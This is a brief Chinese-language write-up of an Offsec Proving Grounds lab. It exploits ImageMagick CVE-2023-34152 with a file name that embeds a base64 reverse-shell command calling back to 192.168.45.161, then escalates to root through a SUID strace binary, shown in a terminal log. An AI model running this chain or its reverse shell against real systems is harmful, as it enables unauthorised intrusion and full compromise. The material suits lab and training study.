image
 \> 参考资料  

[https://github.com/pika5164/Offsec_Proving_Grounds/blob/master/PG_Practice/Linux/image.md](https://github.com/pika5164/Offsec_Proving_Grounds/blob/master/PG_Practice/Linux/image.md)
 
使用 ImageMagick 进行枚举，以识别处理图像上传的 Web 服务器。  
利用 CVE-2023-34152 漏洞，构造包含 base64 编码的反向 shell 有效载荷的图像文件名。  
上传恶意文件并执行有效载荷，以 www-data 身份建立反向 shell。  
使用系统枚举识别具有 SUID 权限的 strace 二进制文件。  
利用 strace 命令，通过 /bin/sh -p 命令生成一个特权 shell，并将权限提升到 root。
 
文件重命名注意  
L2Jpbi9zaCAtaSA+JiAvZGVjL3RjcC8xOTIuMTY4LjQ1LjE2MS84MCAwPiYx
 
cp capoo.jpg |capoo"`echo L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjE2MS84MCAwPiYx | base64 -d | bash`".jpg
   

$ cd /var/www  
$ ls  
html  
local.txt  
$ cat local.txt  
8193b849f6feeee74ae492d175a8f951  
$ install -m =xs $(which strace) .  
install: cannot create regular file './strace': Permission denied  
$ python -c 'import pty;pty.spawn("/bin/bash")'  
/bin/sh: 17: python: not found  
$ python3 -c 'import pty;pty.spawn("/bin/bash")'  
www-data@image:/var/www$ ls  
ls  
html local.txt  
www-data@image:/var/www$ cd /tmp  
cd /tmp  
www-data@image:/tmp$ install -m =xs $(which strace) .  
install -m =xs $(which strace) .  
www-data@image:/tmp$ /usr/bin/strace -o /dev/null /bin/sh -p  
/usr/bin/strace -o /dev/null /bin/sh -p  
# whoami  
whoami  
root  
# cd /root  
cd /root  
# ls  
ls  
ImageMagick-7.1.0-16 email2.txt proof.txt snap  
# cat proof.txt  
cat proof.txt  
a6ee1aa7f9ba5a8f69601b37c2711ba1  
#